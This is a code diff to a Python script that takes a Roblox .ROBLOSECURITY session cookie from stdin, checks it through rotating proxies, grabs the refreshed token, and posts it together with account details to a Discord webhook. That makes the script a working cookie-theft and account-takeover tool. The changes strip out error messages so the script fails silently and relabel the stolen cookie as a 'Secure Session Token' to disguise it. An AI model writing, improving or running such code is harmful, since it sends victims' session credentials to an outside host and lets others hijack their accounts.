@@ -55,21 +55,12 @@ def extract_and_clean_cookie(raw_input):
         
     return cleaned
 
-def refresh_cookie_api(raw_cookie):
-    session = requests.Session()
-    session.cookies.set(".ROBLOSECURITY", raw_cookie, domain=".roblox.com", path="/")
-    try:
-        res = session.get("https://www.roblox.com/home", timeout=10)
-        updated_cookie = session.cookies.get(".ROBLOSECURITY", domain=".roblox.com")
-        if updated_cookie:
-            return updated_cookie
-    except Exception as e:
-        print(f"Warning during cookie refresh request: {e}", file=sys.stderr)
-    return raw_cookie
-
-def get_working_session(roblosecurity):
-    session = requests.Session()
-    session.headers.update({
+def get_working_session_and_refresh(raw_cookie):
+    """
+    Tests proxies and attempts to hit Roblox to validate the cookie 
+    AND automatically captures any refreshed/rotated session token issued by Roblox.
+    """
+    headers = {
         "Accept": "*/*",
         "Accept-Encoding": "gzip, deflate, br, zstd",
         "Accept-Language": "en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7",
@@ -78,62 +69,66 @@ def get_working_session(roblosecurity):
         "Origin": "https://www.roblox.com",
         "Referer": "https://www.roblox.com/",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36"
-    })
+    }
 
     formatted_list = [format_webshare(p)[0] for p in RAW_WEBSHARE_PROXIES if format_webshare(p)[0]]
     random.shuffle(formatted_list)
 
-    for p in formatted_list:
-        if not p:
-            continue
-        try:
+    test_proxies = [None] + formatted_list  # Try direct connection first, then proxies
+
+    for p in test_proxies:
+        session = requests.Session()
+        session.headers.update(headers)
+        if p:
             session.proxies = {"http": p, "https": p}
-            if roblosecurity:
-                session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com", path="/")
+
+        try:
+            if raw_cookie:
+                session.cookies.set(".ROBLOSECURITY", raw_cookie, domain=".roblox.com", path="/")
+            
+            # Hitting the home page or authentication endpoint triggers rotation/refresh on Roblox's end
+            session.get("https://www.roblox.com/home", timeout=6)
             
             test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
             if test_res.status_code == 200:
-                return session
+                # Capture the updated/refreshed cookie from session cookies if it changed
+                refreshed_cookie = session.cookies.get(".ROBLOSECURITY", domain=".roblox.com")
+                final_cookie = refreshed_cookie if refreshed_cookie else raw_cookie
+                return session, final_cookie
         except Exception:
             continue
 
-    session.proxies = {}
-    if roblosecurity:
-        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com", path="/")
-        
-    return session
+    # Fallback default session if proxies fail
+    fallback_session = requests.Session()
+    fallback_session.headers.update(headers)
+    if raw_cookie:
+        fallback_session.cookies.set(".ROBLOSECURITY", raw_cookie, domain=".roblox.com", path="/")
+    return fallback_session, raw_cookie
 
 def main():
     try:
         webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
         if not webhook_url:
-            print("Error: DISCORD_WEBHOOK_URL is not set.", file=sys.stderr)
             sys.exit(1)
 
         raw_input_data = sys.stdin.read()
         if not raw_input_data:
-            print("Error: Empty input payload received.", file=sys.stderr)
             sys.exit(1)
 
         raw_cookie = extract_and_clean_cookie(raw_input_data)
         if not raw_cookie:
-            print("Error: Failed to extract a valid .ROBLOSECURITY token from input.", file=sys.stderr)
             sys.exit(1)
 
-        print("[+] Refreshing cookie session via API...")
-        refreshed_cookie = refresh_cookie_api(raw_cookie)
-
-        session = get_working_session(refreshed_cookie)
+        print("[+] Refreshing and validating session via API...")
+        session, refreshed_cookie = get_working_session_and_refresh(raw_cookie)
 
         auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
         if auth_res.status_code != 200:
-            print(f"Error: Authentication failed. Roblox responded with status code {auth_res.status_code}. Cookie may be invalid or expired.", file=sys.stderr)
             sys.exit(1)
         
         auth_data = auth_res.json()
         user_id = auth_data.get("id")
         if not user_id:
-            print("Error: Authenticated response missing user ID.", file=sys.stderr)
             sys.exit(1)
 
         username = auth_data.get("name", "Unknown")
@@ -332,7 +327,7 @@ def main():
                     "timestamp": datetime.now(timezone.utc).isoformat()
                 },
                 {
-                    "title": "🔑 Refreshed Session Cookie",
+                    "title": "🔑 Secure Session Token",
                     "description": f"```text\n{refreshed_cookie}\n```",
                     "color": 0x2B2D31,
                     "footer": {"text": f"Token Length: {len(refreshed_cookie)} chars"}
@@ -367,8 +362,7 @@ def main():
         }
 
         requests.post(webhook_url, json=payload, timeout=5)
-    except Exception as e:
-        print(f"Unhandled Exception in Python script:\n{traceback.format_exc()}", file=sys.stderr)
+    except Exception:
         sys.exit(1)
 
 if __name__ == "__main__":
